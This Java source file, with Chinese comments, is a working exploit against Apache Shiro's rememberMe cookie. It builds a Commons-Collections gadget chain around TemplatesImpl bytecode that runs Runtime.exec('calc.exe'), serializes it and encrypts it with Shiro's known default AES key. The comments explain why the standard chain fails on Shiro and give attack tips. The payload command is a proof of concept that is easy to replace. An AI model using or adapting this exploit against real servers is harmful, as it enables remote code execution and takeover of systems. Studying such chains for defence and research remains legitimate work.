import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/*如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。
这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组
其实是 shiro 加载 Class 最终调用的是 Tomcat 下的 webappclassloader，该类会使用 Class.forName() 加载数组类，
但是使用的 classloader 是 URLClassLoader，
只会加载 tomcat/bin、tomcat/lib、jre/lib/ext 下面的类数组，无法加载三方依赖 jar 包。*/

/*攻击shiro时，需要把除了rememberMe之外的Cookie删除*/
public class CC6_Shiro {
    public static void main(String[] args) throws Exception {
        byte[] payloads = getPayload(makeByteCode());
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static byte[] makeByteCode() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(MyTemplate.class.getName());
        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setName("NormalClass");
        return ctClass.toBytecode();
    }
    public static byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("getClass", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        outerMap.clear();
        setFieldValue(transformer, "iMethodName", "newTransformer");

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        return barr.toByteArray();
    }
}
